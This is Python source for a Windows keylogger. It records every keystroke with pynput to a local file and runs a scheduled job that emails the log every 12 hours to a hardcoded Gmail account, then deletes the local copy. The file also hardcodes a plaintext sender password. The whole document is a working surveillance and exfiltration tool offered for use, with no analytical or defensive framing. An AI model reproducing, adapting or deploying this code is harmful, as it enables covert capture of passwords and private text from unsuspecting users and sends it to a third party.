###################################
# Keylogger to be used in Windows #
###################################
from pynput.keyboard import Key, Listener
import pynput
from datetime import datetime
import os
import yagmail
from apscheduler.schedulers.blocking import BlockingScheduler
from multiprocessing import Process

def Klogger():

    log = os.environ.get(
        'pylogger_file',
        os.path.expanduser('keylog.txt')
    )

    user = os.path.expanduser("~")
    timi = datetime.now()

    with open (log, 'a') as f:
        f.write(str(user) + '\n' + str(timi) + '\n')

    def on_press(key):
        with open(log, 'a') as f:
            if(key == Key.enter or key == Key.tab):
                f.write('{}\n'.format(key))
            else:
                f.write('{} - '.format(key))


    with Listener(on_press=on_press) as listener:
        listener.join()

def sendLog(log):
    sender_email = "kloggertest42069@gmail.com"
    receiver_email = "kloggertest42069@gmail.com"
    subject = "Klogger"
    sender_password = "rotkiv1234"

    yag = yagmail.SMTP(user=sender_email, password=sender_password)

    contents = [
    "Klogger of the day"
    ]


    yag.send(receiver_email, subject, contents, attachments=log )

def mailInterval():
    sched = BlockingScheduler()
    @sched.scheduled_job('interval', hours=12)
    def timed_job():
        homedir = "keylog.txt"
        sendLog(homedir)
        os.remove(homedir)
    sched.start()

if __name__ == '__main__':
    p1 = Process(target=Klogger)
    p1.start()
    p2 = Process(target=mailInterval)
    p2.start()
    p1.join()
    p2.join()
